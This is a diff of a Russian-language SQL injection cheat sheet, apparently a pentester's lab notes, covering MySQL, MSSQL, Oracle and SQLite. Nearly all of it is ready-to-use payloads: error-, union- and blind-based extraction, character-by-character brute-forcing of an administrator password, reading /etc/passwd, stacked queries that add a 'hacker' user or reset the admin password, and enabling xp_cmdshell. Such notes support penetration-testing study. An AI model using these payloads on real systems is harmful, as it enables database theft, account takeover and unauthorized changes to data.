@@ -23,6 +23,7 @@ SELECT * FROM users WHERE (username = "[INPUT]")	=> ") or 1=1 -- //
 ' union select sqlite_version() --	-- SQLite
 Также по вызову времени задержки
 
+
 ========================================================
 ================SQL INJECTION. MySQL 3306
 mysql -u root -p 'root' -h 192.168.50.16 -P 3306 --skip-ssl-verify-server-cert
@@ -48,6 +49,16 @@ select schema_name 	from information_schema.schemata				все БД
 select table_name 	from information_schema.tables	WHERE table_schema='offsec'	таблицы в БД offsec
 select column_name	from information_schema.columns	WHERE table_name='users'	колонки в таблице users в БД offsec
 
+Error-based:
+' and extractvalue(1,concat(0x7e,version())) --                          -- версия
+' and extractvalue(1,concat(0x7e,database())) --                         -- текущая БД
+' and extractvalue(1,concat(0x7e,(select group_concat(schema_name) from information_schema.schemata))) -- -- все БД
+' and extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()))) -- -- таблицы в текущей БД
+' and extractvalue(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name='users'))) -- -- колонки
+' and extractvalue(1,concat(0x7e,(select group_concat(concat(username,':',password)) from users))) -- -- данные
+' and extractvalue(1,concat(0x7e,(select load_file('/etc/passwd')))) -- -- чтение файла
+
+Union-based
 ' ORDER BY 6 -- // проверить количество колонок в используемом запросе - надо выровнять с количеством колонок в основном запросе
 %' UNION SELECT null, database(), user(), version(), null -- // % - любое количество любых символ (_ - 1 символ)
 ' UNION select 1, 2, 3, 4, schema_name, 6 from information_schema.schemata -- // список всех БД
@@ -57,10 +68,15 @@ select column_name	from information_schema.columns	WHERE table_name='users'	коло
 '; insert into users(username,password) values('hacker','123') -- 
 '; update users set password='123' where username='admin' -- 
 
+Blind-based
 ' and 1=2 -- // проверка, что слепая инъекция может быть проведена, при 1=1 запись выводится, при 1=2 - нет
 ' and if(1=1,sleep(3),0) -- // тоже самое с проверкой по времени, 1=1 выполнится через 3 секунды, 1=2 мгновенно
 	с проверкой по времени запрос не выводит результат, т.к. sleep(3) возвращает 0, 0 (3й арг.) тоже возвращает 0, if возвращает false
 	для того, чтобы результат запроса был выполнен, if должен вернуть true: ' and if(1=2, sleep(3), 1)
+'||(select case when 1=1 then 1/0 else '' end from users where username='administrator')||'	проверка на ошибку при слепой инъекции
+'||(select case when length(password)>19 then 1/0 else username end from users where username='administrator')||'	проверка длины пароля
+'||(select case when substring(password,1,1)='a' then 1/0 else username end from users where username='administrator')||'
+	перебор пароля в интрудере
 
 Проверка версии БД:
 ' and extractvalue(1,concat(0x7e,database())) -- проверка на error-based версии, работает только при включенном выводе об ошибках
@@ -145,6 +161,7 @@ Error-based:
 '+and+(select+substring(password,1,14)+from+users+where+username='administrator')='gwm4bpt90wwtwa'+-- // процесс, когда уже нашлись 13 символов,
 	последняя буква 'a' ставится в значок параграфа для перебора, Payloads  - Brouteforcer с длинами от 1 до 1
 
+
 ========================================================
 ================SQL INJECTION. MSSQL 1433
 sqlcmd -S 192.168.50.19 -U sa -P password
@@ -172,7 +189,13 @@ select is_srvrolemember('sysadmin');  -- проверка прав (1 = да), роль sysadmin, 
 Error-based:
 ' and 1=convert(int,@@version) -- // версия в ошибке
 ' and 1=convert(int,db_name()) -- // БД в ошибке
+' and 1=convert(int,user_name()) --                          -- текущий пользователь
+' and 1=convert(int,(select top 1 name from master.dbo.sysdatabases)) -- -- первая БД
+' and 1=convert(int,(select top 1 name from sysobjects where xtype='U')) -- -- первая таблица
+' and 1=convert(int,(select top 1 name from syscolumns where id=(select id from sysobjects where name='users'))) -- -- первая колонка users
+' and 1=convert(int,(select top 1 username from users)) --   -- первый пользователь
 
+Union-based
 ' order by 5 --
 ' union select null,null,null --
 ' union select @@version,db_name(),user_name() --
@@ -187,6 +210,10 @@ Blind injectin:
 '; if user_name()='dbo' waitfor delay '00:00:05' -- // Database Owner, есть права на xp_cmdshell
 '; if is_srvrolemember('sysadmin')=1 waitfor delay '00:00:05' -- // роль sysadmin, полные права на БД 
 '; if has_perms_by_name(null, null, 'EXECUTE')=1 waitfor delay '00:00:05' -- // проверка прав на исполнение
+' + (select case when (1=1) then cast(1/0 as varchar) else '' end from users where username='administrator') + '    конкатенация проверки на ошибку
+' + (select case when len(password)>19 then cast(1/0 as varchar) else username end from users where username='administrator') + ' длина пароля>20
+'+%2B(select+case+when+substring(password,1,1)='a'+then+cast(1/0+as+varchar)+else+username+end+from+users+where+username='administrator')+%2B+'
+	конкатенация %2B, перебор пароля посимвольно в интрудере
 
 Активация работы функции xp_cmdshell:
 '; select count(*) from master.dbo.sysobjects where name='xp_cmdshell' -- // проверка доступности
@@ -213,7 +240,6 @@ select dbms_pipe.receive_message('a',5) from dual;   	-- задержка 5 сек
 select count(*) from all_tables;                     	-- количество таблиц
 'foo'||'bar'
 SUBSTR('foobar', 4, 2)
-dbms_pipe.receive_message(('a'),10)
 
 select name from v$database;                         	-- все БД (одна строка)
 select username from all_users;                        	-- все схемы (пользователи)
@@ -223,8 +249,14 @@ select distinct owner from all_tables;                 	-- схемы с таблицами
 
 Error-based:
 ' and 1=ctxsys.drithsx.sn(1,(select banner from v$version where rownum=1)) --  -- версия в ошибке
-' and 1=ctxsys.drithsx.sn(1,(select username from all_users where rownum=1)) --  -- первый пользователь
+' and 1=ctxsys.drithsx.sn(1,(select name from v$database)) --                     -- имя БД
+' and 1=ctxsys.drithsx.sn(1,(select user from dual)) --                           -- текущий пользователь
+' and 1=ctxsys.drithsx.sn(1,(select username from all_users where rownum=1)) --   -- первый пользователь
+' and 1=ctxsys.drithsx.sn(1,(select table_name from all_tables where owner='SCOTT' and rownum=1)) -- -- первая таблица
+' and 1=ctxsys.drithsx.sn(1,(select column_name from all_tab_columns where table_name='USERS' and rownum=1)) -- -- первая колонка
+' and 1=ctxsys.drithsx.sn(1,(select username from scott.users where rownum=1)) -- -- первый пользователь
 
+Union-based:
 '+UNION+SELECT+'abc','def'+FROM+dual--
 '+UNION+SELECT+BANNER,NULL+FROM+v$version+where+rownum=1--
 	таблица dual всегда есть, обязательно from в запросах, banner занимает несколько строк, поэтому выводим только 1, иначе ошибка
@@ -242,7 +274,10 @@ Error-based:
 Blind injection:
 '+and+(select+1+from+dual+where+dbms_pipe.receive_message(123,10)+is+null)+is+null+--+
 	прокерка слепой инъекции, что текущая БД - Oracle, если будет задержка 10 сек
-xyz' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) > 'm -- // 1й символ пароля больше, чем "m"
+' AND SUBSTR((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) > 'm -- // 1й символ пароля больше, чем "m"
+'||(select+case+when+(1=1)+then+to_char(1/0)+else+''+end+from+users+where+username='administrator')||'	конкатенация для проверки на ошибку
+'||(select+case+when+length(password)>19+then+to_char(1/0)+else+username+end+from+users+where+username='administrator')||'	длина пароля > 20
+'||(select+case+when+substr(password,1,1)='a'+then+to_char(1/0)+else+username+end+from+users+where+username='administrator')||' перебор пароля
 
 Stack queries (обычно не работают в Oracle):
 ' begin dbms_pipe.receive_message('a',5); end; --        -- PL/SQL блок (редко)
@@ -280,10 +315,11 @@ pragma table_info('users');                                -- колонки таблицы us
 
 ' and 1=1 --   
 
-Error-based
+Error-based:
 ' and 1=cast(sqlite_version() as integer) --          -- ошибка если строка не число
 ' and 1=cast((select name from sqlite_master limit 1) as integer) --
 
+Union-based:
 ' order by 5 --                                      -- определить колонки
 ' union select null,null,null --                      -- 3 колонки
 ' union select 1,2,3 --                               -- выводящиеся позиции
